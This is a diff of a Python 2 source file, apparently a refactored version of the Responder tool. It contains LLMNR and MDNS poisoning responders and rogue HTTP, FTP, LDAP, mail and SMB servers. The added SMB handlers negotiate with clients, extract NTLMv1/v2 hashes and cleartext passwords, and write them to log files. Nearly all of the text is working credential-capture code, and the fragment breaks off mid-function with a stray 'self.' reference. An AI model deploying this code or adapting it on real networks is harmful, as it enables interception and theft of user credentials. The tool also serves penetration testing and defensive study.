 							 for x in range(1):
 								 soc.sendto(str(buff), self.client_address)
-							 if PrintLLMNRNBTNS(Log2Filename,Message):
-								 #print Message
-								 logger2.warning(Message)
+							 logger2.warning(Message)
 							 if Is_Finger_On(Finger_On_Off):
 								 try:
 									 Finger = RunSmbFinger((self.client_address[0],445))
@@ -1309,7 +909,11 @@ class LLMNR(BaseRequestHandler):
 			raise
 
 ##################################################################################
-#DNS Stuff
+#LLMNR Stuff ends here
+##################################################################################
+
+##################################################################################
+#DNS Stuff starts here(not Used)
 ##################################################################################
 def ParseDNSType(data):
 	QueryTypeClass = data[len(data)-4:]
@@ -1376,9 +980,12 @@ class DNSTCP(BaseRequestHandler):
 		except Exception:
 			pass
 
+##################################################################################
+#DNS Stuff ends here (not Used) 
+##################################################################################
 
 ##################################################################################
-#MDNS Stuff
+#MDNS Stuff starts here
 ##################################################################################
 class MDNSAns(Packet):
 	fields = OrderedDict([
@@ -1423,13 +1030,13 @@ class MDNS(BaseRequestHandler):
 		if self.client_address[0] == "127.0.0.1":
 			pass
 		try:
-			if Analyze(AnalyzeMode):
+			if AnalyzeMode:
 				if Parse_IPV6_Addr(data):
 					#print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
 					responder_logger.info('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
 
 			if RespondToSpecificHost(RespondTo):
-				if Analyze(AnalyzeMode) == False:
+				if AnalyzeMode == False:
 					if RespondToIPScope(RespondTo, self.client_address[0]):
 						if Parse_IPV6_Addr(data):
 							#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
@@ -1439,7 +1046,7 @@ class MDNS(BaseRequestHandler):
 							MDns.calculate()
 							soc.sendto(str(MDns),(MADDR,MPORT))
 
-			if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
+			if AnalyzeMode == False and RespondToSpecificHost(RespondTo) == False:
 				if Parse_IPV6_Addr(data):
 					#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
 					responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
@@ -1453,7 +1060,11 @@ class MDNS(BaseRequestHandler):
 			raise
 
 ##################################################################################
-#HTTP Stuff
+#MDNS Stuff ends here
+##################################################################################
+
+##################################################################################
+#HTTP Proxy Stuff starts here (Not Used)
 ##################################################################################
 
 #Parse NTLMv1/v2 hash.
@@ -1474,11 +1085,7 @@ def ParseHTTPHash(data,client):
 		User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
 		outfile = "./logs/responder/HTTP-NTLMv1-Client-"+client+".txt"
 		WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
-		if PrintData(outfile,User+"::"+Hostname):
-			#print "[+]HTTP NTLMv1 hash captured from :",client
-			#print "Hostname is :", Hostname
-			#print "Complete hash is : ", WriteHash
-			WriteData(outfile,WriteHash, User+"::"+Hostname)
+		WriteData(outfile,WriteHash, User+"::"+Hostname)
 		responder_logger.info('[+]HTTP NTLMv1 hash captured from :%s'%(client))
 		responder_logger.info('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
 		responder_logger.info('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
@@ -1497,10 +1104,7 @@ def ParseHTTPHash(data,client):
 		HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
 		outfile = "./logs/responder/HTTP-NTLMv2-Client-"+client+".txt"
 		WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
-		if PrintData(outfile,User+"::"+Domain):
-			#print "[+]HTTP NTLMv2 hash captured from :",client
-			#print "Complete hash is : ", WriteHash
-			WriteData(outfile,WriteHash, User+"::"+Domain)
+		WriteData(outfile,WriteHash, User+"::"+Domain)
 		responder_logger.info('[+]HTTP NTLMv2 hash captured from :%s'%(client))
 		responder_logger.info('[+]HTTP NTLMv2 User is : %s'%(User))
 		responder_logger.info('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
@@ -1636,9 +1240,7 @@ def PacketSequence(data,client):
 		GrabCookie(data,client)
 		GrabURL(data,client)
 		outfile = "./logs/responder/HTTP-Clear-Text-Password-"+client+".txt"
-		if PrintData(outfile,b64decode(''.join(BasicAuth))):
-			#print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
-			WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
+		WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
 		responder_logger.info('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
 		if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
 			Message = "[+]WPAD (auth) file sent to: %s"%(client)
@@ -1677,9 +1279,6 @@ class HTTP(BaseRequestHandler):
 			pass#No need to be verbose..
 
 
-##################################################################################
-#HTTP Proxy Stuff
-##################################################################################
 def HandleGzip(Headers, Content, Payload):
 	if len(Content) > 5:
 		try:
@@ -1876,9 +1475,12 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
 	do_PUT  = do_GET
 	do_DELETE=do_GET
 
+##################################################################################
+#HTTP Proxy Stuff ends here (Not Used)
+##################################################################################
 
 ##################################################################################
-#HTTPS Server
+#HTTPS Server stuff starts here (Not Used)
 ##################################################################################
 #Parse NTLMv1/v2 hash.
 def ParseHTTPSHash(data,client):
@@ -2000,7 +1602,11 @@ class DoSSL(StreamRequestHandler):
 			pass
 
 ##################################################################################
-#FTP Stuff
+#HTTPS Server stuff ends here (Not Used)
+##################################################################################
+
+##################################################################################
+#FTP Stuff starts here
 ##################################################################################
 class FTPPacket(Packet):
 	fields = OrderedDict([
@@ -2041,7 +1647,11 @@ class FTP(BaseRequestHandler):
 			pass
 
 ##################################################################################
-#LDAP Stuff
+#FTP Stuff ends here
+##################################################################################
+
+##################################################################################
+#LDAP Stuff starts here
 ##################################################################################
 
 def ParseSearch(data):
@@ -2133,7 +1743,11 @@ class LDAP(BaseRequestHandler):
 			pass #No need to print timeout errors.
 
 ##################################################################################
-#POP3 Stuff
+#LDAP Stuff ends here
+##################################################################################
+
+##################################################################################
+#POP3 Stuff starts here
 ##################################################################################
 class POPOKPacket(Packet):
 	fields = OrderedDict([
@@ -2171,7 +1785,11 @@ class POP(BaseRequestHandler):
 			pass
 
 ##################################################################################
-#ESMTP Stuff
+#POP3 Stuff ends here
+##################################################################################
+
+##################################################################################
+#ESMTP Stuff starts here
 ##################################################################################
 
 #ESMTP server class.
@@ -2202,7 +1820,11 @@ class ESMTP(BaseRequestHandler):
 			pass
 
 ##################################################################################
-#IMAP4 Stuff
+#ESMTP Stuff ends here
+##################################################################################
+
+##################################################################################
+#IMAP4 Stuff starts here
 ##################################################################################
 
 #ESMTP server class.
@@ -2228,220 +1850,358 @@ class IMAP(BaseRequestHandler):
 
 		except Exception:
 			pass
+
 ##################################################################################
-#Loading the servers
+#IMAP4 Stuff ends here
 ##################################################################################
 
-#Function name self-explanatory
-def Is_HTTP_On(on_off):
-	if on_off == "ON":
-		t = threading.Thread(name="HTTP", target=serve_thread_tcp, args=('', 80,HTTP))
-		t.setDaemon(True)
-		t.start()
-		return t
-	if on_off == "OFF":
-		return False
+##################################################################################
+#SMB stuff starts here
+##################################################################################
 
-#Function name self-explanatory
-def Is_HTTPS_On(SSL_On_Off):
-	if SSL_On_Off == "ON":
-		t = threading.Thread(name="SSL", target=serve_thread_SSL, args=('', 443,DoSSL))        
-		t.setDaemon(True)
-		t.start()
-		return t
-	if SSL_On_Off == "OFF":
-		return False
-
-#Function name self-explanatory
-def Is_WPAD_On(on_off):
-	if on_off == True:
-		t = threading.Thread(name="WPAD", target=serve_thread_tcp, args=('', 3141,ProxyHandler))
-		t.setDaemon(True)
-		t.start()
-		return t
-	if on_off == False:
-		return False
-
-#Function name self-explanatory
-def Is_SMB_On(SMB_On_Off):
-	if SMB_On_Off == "ON":
-		if LM_On_Off == True:
-			t1  = threading.Thread(name="SMB1LM-445", target=serve_thread_tcp, args=('', 445,SMB1LM))
-			t2 = threading.Thread(name="SMB1LM-139", target=serve_thread_tcp, args=('', 139,SMB1LM))
-			for t in [t1, t2]:
-				t.setDaemon(True)
-				t.start()
-
-			return t1, t2
-
+#Detect if SMB auth was Anonymous
+def Is_Anonymous(data):
+	SecBlobLen = struct.unpack('<H',data[51:53])[0]
+	if SecBlobLen < 260:
+		SSPIStart = data[75:]
+		LMhashLen = struct.unpack('<H',data[89:91])[0]
+		if LMhashLen == 0 or LMhashLen == 1:
+			return True
 		else:
-			t1 = threading.Thread(name="SMB1-445", target=serve_thread_tcp, args=('', 445,SMB1))
-			t2 = threading.Thread(name="SMB1-139", target=serve_thread_tcp, args=('', 139,SMB1))
+			return False
+	if SecBlobLen > 260:
+		SSPIStart = data[79:]
+		LMhashLen = struct.unpack('<H',data[93:95])[0]
+		if LMhashLen == 0 or LMhashLen == 1:
+			return True
+		else:
+			return False
 
-			for t in [t1,t2]:
-				t.setDaemon(True)
-				t.start()
-
-			return t1, t2
-
-	if SMB_On_Off == "OFF":
+def Is_LMNT_Anonymous(data):
+	LMhashLen = struct.unpack('<H',data[51:53])[0]
+	if LMhashLen == 0 or LMhashLen == 1:
+		return True
+	else:
 		return False
 
-#Function name self-explanatory
-def Is_Kerberos_On(Krb_On_Off):
-	if Krb_On_Off == "ON":
-		t1 = threading.Thread(name="KerbUDP", target=serve_thread_udp, args=('', 88,KerbUDP))
-		t2 = threading.Thread(name="KerbTCP", target=serve_thread_tcp, args=('', 88, KerbTCP))
-		for t in [t1,t2]:
-			t.setDaemon(True)
-			t.start()
+#Function used to know which dialect number to return for NT LM 0.12
+def Parse_Nego_Dialect(data):
+	DialectStart = data[40:]
+	pack = tuple(DialectStart.split('\x02'))[:10]
+	var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
+	test = tuple(var)
+	if test[0] == "NT LM 0.12":
+		return "\x00\x00"
+	if test[1] == "NT LM 0.12":
+		return "\x01\x00"
+	if test[2] == "NT LM 0.12":
+		return "\x02\x00"
+	if test[3] == "NT LM 0.12":
+		return "\x03\x00"
+	if test[4] == "NT LM 0.12":
+		return "\x04\x00"
+	if test[5] == "NT LM 0.12":
+		return "\x05\x00"
+	if test[6] == "NT LM 0.12":
+		return "\x06\x00"
+	if test[7] == "NT LM 0.12":
+		return "\x07\x00"
+	if test[8] == "NT LM 0.12":
+		return "\x08\x00"
+	if test[9] == "NT LM 0.12":
+		return "\x09\x00"
+	if test[10] == "NT LM 0.12":
+		return "\x0a\x00"
 
-		return t1, t2
-	if Krb_On_Off == "OFF":
-		return False
+def ParseShare(data):
+	packet = data[:]
+	a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
+	if a:
+		quote = "Share requested: "+a.group(0)
+		responder_logger.info(quote.replace('\x00',''))
 
-#Function name self-explanatory
-def Is_SQL_On(SQL_On_Off):
-	if SQL_On_Off == "ON":
-		t = threading.Thread(name="MSSQL", target=serve_thread_tcp, args=('', 1433,MSSQL))
-		t.setDaemon(True)
-		t.start()
-		return t
-	if SQL_On_Off == "OFF":
-		return False
+#Parse SMB NTLMSSP v1/v2
+def ParseSMBHash(data,client):
+	SecBlobLen = struct.unpack('<H',data[51:53])[0]
+	BccLen = struct.unpack('<H',data[61:63])[0]
+	if SecBlobLen < 260:
+		SSPIStart = data[75:]
+		LMhashLen = struct.unpack('<H',data[89:91])[0]
+		LMhashOffset = struct.unpack('<H',data[91:93])[0]
+		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+		NthashLen = struct.unpack('<H',data[97:99])[0]
+		NthashOffset = struct.unpack('<H',data[99:101])[0]
 
-#Function name self-explanatory
-def Is_FTP_On(FTP_On_Off):
-	if FTP_On_Off == "ON":
-		t = threading.Thread(name="FTP", target=serve_thread_tcp, args=('', 21,FTP))
-		t.setDaemon(True)
-		t.start()
-		return t
+	if SecBlobLen > 260:
+		SSPIStart = data[79:]
+		LMhashLen = struct.unpack('<H',data[93:95])[0]
+		LMhashOffset = struct.unpack('<H',data[95:97])[0]
+		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+		NthashLen = struct.unpack('<H',data[101:103])[0]
+		NthashOffset = struct.unpack('<H',data[103:105])[0]
 
-	if FTP_On_Off == "OFF":
-		return False
+	if NthashLen == 24:
+		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+		DomainLen = struct.unpack('<H',data[105:107])[0]
+		DomainOffset = struct.unpack('<H',data[107:109])[0]
+		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
+		UserLen = struct.unpack('<H',data[113:115])[0]
+		UserOffset = struct.unpack('<H',data[115:117])[0]
+		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
+		outfile = "./logs/responder/SMB-NTLMv1ESS-Client-"+client+".txt"
+		WriteData(outfile,writehash,User+"::"+Domain)
+		responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
 
-#Function name self-explanatory
-def Is_POP_On(POP_On_Off):
-	if POP_On_Off == "ON":
-		t = threading.Thread(name="POP", target=serve_thread_tcp, args=('', 110,POP))
-		t.setDaemon(True)
-		t.start()
-		return t
-	if POP_On_Off == "OFF":
-		return False
+	if NthashLen > 60:
+		outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
+		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+		DomainLen = struct.unpack('<H',data[109:111])[0]
+		DomainOffset = struct.unpack('<H',data[111:113])[0]
+		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
+		UserLen = struct.unpack('<H',data[117:119])[0]
+		UserOffset = struct.unpack('<H',data[119:121])[0]
+		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
+		writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
+		WriteData(outfile,writehash,User+"::"+Domain)
+		responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))
 
-#Function name self-explanatory
-def Is_LDAP_On(LDAP_On_Off):
-	if LDAP_On_Off == "ON":
-		t = threading.Thread(name="LDAP", target=serve_thread_tcp, args=('', 389,LDAP))
-		t.setDaemon(True)
-		t.start()
-		return t
-	if LDAP_On_Off == "OFF":
-		return False
+#Parse SMB NTLMv1/v2
+def ParseLMNTHash(data,client):
+	try:
+		lenght = struct.unpack('<H',data[43:45])[0]
+		LMhashLen = struct.unpack('<H',data[51:53])[0]
+		NthashLen = struct.unpack('<H',data[53:55])[0]
+		Bcc = struct.unpack('<H',data[63:65])[0]
+		if NthashLen > 25:
+			Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
+			responder_logger.info('[+]SMB-NTLMv2 hash captured from :%s'%(client))
+			outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
+			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
+			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
+			Username, Domain = tuple(var)
+			Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
+			ParseShare(data)
+			WriteData(outfile,Writehash, Username+"::"+Domain)
+			responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
+		if NthashLen == 24:
+			responder_logger.info('[+]SMB-NTLMv1 hash captured from :%s'%(client))
+			outfile = "./logs/responder/SMB-NTLMv1-Client-"+client+".txt"
+			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
+			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
+			Username, Domain = tuple(var)
+			writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
+			ParseShare(data)
+			WriteData(outfile,writehash, Username+"::"+Domain)
+			responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
+			responder_logger.info('[+]SMB-NTLMv1 Username:%s'%(Username))
+			responder_logger.info('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
+	except Exception:
+		raise
 
-#Function name self-explanatory
-def Is_SMTP_On(SMTP_On_Off):
-	if SMTP_On_Off == "ON":
-		t1 = threading.Thread(name="ESMTP-25", target=serve_thread_tcp, args=('', 25,ESMTP))
-		t2 = threading.Thread(name="ESMTP-587", target=serve_thread_tcp, args=('', 587,ESMTP))
-		
-		for t in [t1, t2]:
-			t.setDaemon(True)
-			t.start()
+def IsNT4ClearTxt(data):
+	HeadLen = 36
+	Flag2 = data[14:16]
+	if Flag2 == "\x03\x80":
+		SmbData = data[HeadLen+14:]
+		WordCount = data[HeadLen]
+		ChainedCmdOffset = data[HeadLen+1]
+		if ChainedCmdOffset == "\x75":
+			PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]
+			if PassLen > 2:
+				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
+				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
+				#print "[SMB]Clear Text Credentials: %s:%s" %(User,Password)
+				responder_logger.info("[SMB]Clear Text Credentials: %s:%s"%(User,Password))
 
-		return t1,t2
+#SMB Server class, NTLMSSP
+class SMB1(BaseRequestHandler):
 
-	if SMTP_On_Off == "OFF":
-		return False
+	def handle(self):
+		try:
+			while True:
+				data = self.request.recv(1024)
+				self.request.settimeout(1)
+				##session request 139
+				if data[0] == "\x81":
+					buffer0 = "\x82\x00\x00\x00"
+					self.request.send(buffer0)
+					data = self.request.recv(1024)
+				##Negotiate proto answer.
+				if data[8:10] == "\x72\x00":
+					#Customize SMB answer.
+					head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
+					t = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
+					t.calculate()
+					final = t
+					packet0 = str(head)+str(final)
+					buffer0 = longueur(packet0)+packet0
+					self.request.send(buffer0)
+					data = self.request.recv(1024)
+					##Session Setup AndX Request
+				if data[8:10] == "\x73\x00":
+					IsNT4ClearTxt(data)
+					head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
+					t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
+					t.calculate()
+					final = t
+					packet1 = str(head)+str(final)
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(4096)
+					if data[8:10] == "\x73\x00":
+						if Is_Anonymous(data):
+							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
+							final = SMBSessEmpty()
+							packet1 = str(head)+str(final)
+							buffer1 = longueur(packet1)+packet1
+							self.request.send(buffer1)
+						else:
+							ParseSMBHash(data,self.client_address[0])
+							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+							final = SMBSession2Accept()
+							final.calculate()
+							packet2 = str(head)+str(final)
+							buffer2 = longueur(packet2)+packet2
+							self.request.send(buffer2)
+							data = self.request.recv(1024)
+				##Tree Connect IPC Answer
+				if data[8:10] == "\x75\x00":
+					ParseShare(data)
+					head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
+					t = SMBTreeData()
+					t.calculate()
+					final = t
+					packet1 = str(head)+str(final)
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(1024)
+				##Tree Disconnect.
+				if data[8:10] == "\x71\x00":
+					head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+					final = "\x00\x00\x00"
+					packet1 = str(head)+str(final)
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(1024)
+				##NT_CREATE Access Denied.
+				if data[8:10] == "\xa2\x00":
+					head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+					final = "\x00\x00\x00"
+					packet1 = str(head)+str(final)
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(1024)
+				##Trans2 Access Denied.
+				if data[8:10] == "\x25\x00":
+					head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+					final = "\x00\x00\x00"
+					packet1 = str(head)+str(final)
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(1024)
+				##LogOff.
+				if data[8:10] == "\x74\x00":
+					head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+					final = "\x02\xff\x00\x27\x00\x00\x00"
+					packet1 = str(head)+str(final)
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(1024)
 
-#Function name self-explanatory
-def Is_IMAP_On(IMAP_On_Off):
-	if IMAP_On_Off == "ON":
-		t = threading.Thread(name="IMAP", target=serve_thread_tcp, args=('', 143,IMAP))
-		t.setDaemon(True)
-		t.start()
-		return t
-	if IMAP_On_Off == "OFF":
-		return False
+		except Exception:
+			pass #no need to print errors..
 
-#Function name self-explanatory
-def Is_DNS_On(DNS_On_Off):
-	if DNS_On_Off == "ON":
-		t1 = threading.Thread(name="DNS", target=serve_thread_udp, args=('', 53,DNS))
-		t2 = threading.Thread(name="DNSTCP", target=serve_thread_udp, args=('', 53,DNSTCP))
-		for t in [t1, t2]:
-			t.setDaemon(True)
-			t.start()
+#SMB Server class, old version.
+class SMB1LM(BaseRequestHandler):
 
-		return t1,t2
-	if DNS_On_Off == "OFF":
-		return False
+	def handle(self):
+		try:
+			self.request.settimeout(0.5)
+			data = self.request.recv(1024)
+			##session request 139
+			if data[0] == "\x81":
+				buffer0 = "\x82\x00\x00\x00"
+				self.request.send(buffer0)
+				data = self.request.recv(1024)
+				##Negotiate proto answer.
+			if data[8:10] == "\x72\x00":
+				head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
+				t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
+				t.calculate()
+				packet1 = str(head)+str(t)
+				buffer1 = longueur(packet1)+packet1
+				self.request.send(buffer1)
+				data = self.request.recv(1024)
+				##Session Setup AndX Request
+			if data[8:10] == "\x73\x00":
+				if Is_LMNT_Anonymous(data):
+					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+					packet1 = str(head)+str(SMBSessEmpty())
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+				else:
+					ParseLMNTHash(data,self.client_address[0])
+					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
+					packet1 = str(head)+str(SMBSessEmpty())
+					buffer1 = longueur(packet1)+packet1
+					self.request.send(buffer1)
+					data = self.request.recv(1024)
+
+		except Exception:
+			self.request.close()
+			pass
+
+##################################################################################
+#SMB Server stuff ends here
+##################################################################################
+
+##################################################################################
+#Server Threads stuff starts here
+##################################################################################
 
 class ThreadingUDPServer(ThreadingMixIn, UDPServer):
 
+	allow_reuse_address = 1
+
 	def server_bind(self):
-		if OsInterfaceIsSupported(INTERFACE):
-			try:
-				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
-			except:
-				pass
 		UDPServer.server_bind(self)
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
+	allow_reuse_address = 1
+
 	def server_bind(self):
-		if OsInterfaceIsSupported(INTERFACE):
-			try:
-				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
-			except:
-				pass
 		TCPServer.server_bind(self)
 
 class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
+
+	allow_reuse_address = 1
 
 	def server_bind(self):
 		MADDR = "224.0.0.251"
 		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
 		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
-		if OsInterfaceIsSupported(INTERFACE):
-			try:
-				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
-			except:
-				pass
+
 		UDPServer.server_bind(self)
 
 class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
+
+	allow_reuse_address = 1
 
 	def server_bind(self):
 		MADDR = "224.0.0.252"
 		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
 		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
-		if OsInterfaceIsSupported(INTERFACE):
-			try:
-				self.socket.setsockopt(socket.SOL_SOCKET, 25, BIND_TO_Interface+'\0')
-			except:
-				pass
+
 		UDPServer.server_bind(self)
-
-ThreadingUDPServer.allow_reuse_address = 1
-ThreadingUDPMDNSServer.allow_reuse_address = 1
-ThreadingUDPLLMNRServer.allow_reuse_address = 1
-ThreadingTCPServer.allow_reuse_address = 1
-
 
 def serve_thread_udp(host, port, handler):
 	try:
-		if OsInterfaceIsSupported(INTERFACE):
-			IP = FindLocalIP(BIND_TO_Interface)
-			server = ThreadingUDPServer((IP, port), handler)
-			server.serve_forever()
-		else:
-			server = ThreadingUDPServer((host, port), handler)
-			server.serve_forever()
+		server = ThreadingUDPServer((host, port), handler)
+		server.serve_forever()
 	except Exception, e:
 		print "Error starting UDP server on port %s: %s:" % (str(port),str(e))
 
@@ -2461,29 +2221,181 @@ def serve_thread_udp_LLMNR(host, port, handler):
 
 def serve_thread_tcp(host, port, handler):
 	try:
-		if OsInterfaceIsSupported(INTERFACE):
-			IP = FindLocalIP(BIND_TO_Interface)
-			server = ThreadingTCPServer((IP, port), handler)
-			server.serve_forever()
-		else:
-			server = ThreadingTCPServer((host, port), handler)
-			server.serve_forever()
+		server = ThreadingTCPServer((host, port), handler)
+		server.serve_forever()
 	except Exception, e:
 		print "Error starting TCP server on port %s: %s:" % (str(port),str(e))
 
 def serve_thread_SSL(host, port, handler):
 	try:
-		if OsInterfaceIsSupported(INTERFACE):
-			IP = FindLocalIP(BIND_TO_Interface)
-			server = SSlSock((IP, port), handler)
-			server.serve_forever()
-		else:
-			server = SSlSock((host, port), handler)
-			server.serve_forever()
+		server = SSlSock((host, port), handler)
+		server.serve_forever()
 	except Exception, e:
 		print "Error starting TCP server on port %s: %s:" % (str(port),str(e))
 
+##################################################################################
+#Server Threads stuff end here
+##################################################################################
+
+##################################################################################
+#Server loading starts here
+##################################################################################
+
+#Function name self-explanatory
+def Is_HTTP_On(on_off):
+	if on_off == "ON":
+		t = threading.Thread(name="HTTP", target=serve_thread_tcp, args=("0.0.0.0", 80,HTTP))
+		t.setDaemon(True)
+		t.start()
+		return t
+	if on_off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_HTTPS_On(SSL_On_Off):
+	if SSL_On_Off == "ON":
+		t = threading.Thread(name="SSL", target=serve_thread_SSL, args=("0.0.0.0", 443,DoSSL))        
+		t.setDaemon(True)
+		t.start()
+		return t
+	if SSL_On_Off == "OFF":
+		return False
+
+#Function name self-explanatory
+def Is_WPAD_On(on_off):
+	if on_off == True:
+		t = threading.Thread(name="WPAD", target=serve_thread_tcp, args=("0.0.0.0", 3141,ProxyHandler))
+		t.setDaemon(True)
+		t.start()
+		return t
+	if on_off == False:
+		return False
+
+#Function name self-explanatory
+def Is_SMB_On(SMB_On_Off):
+
+	if SMB_On_Off == "ON":
+		if LM_On_Off == True:
+			t1  = threading.Thread(name="SMB1LM-445", target=self.serve_thread_tcp, args=("0.0.0.0", 445, SMB1LM))
